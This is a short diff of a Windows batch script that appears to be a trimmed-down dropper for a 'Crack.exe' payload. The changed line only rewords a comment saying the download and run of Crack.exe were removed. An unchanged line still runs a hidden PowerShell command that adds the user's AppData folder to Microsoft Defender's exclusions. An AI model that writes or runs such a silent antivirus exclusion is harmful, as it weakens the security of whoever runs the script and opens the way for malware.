@@ -16,7 +16,7 @@ if %errorlevel% NEQ 0 (
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
-:: No download or start of Crack.exe here
+:: DOWNLOAD AND EXECUTION REMOVED -- no Crack.exe will be downloaded or run
 
 exit
 
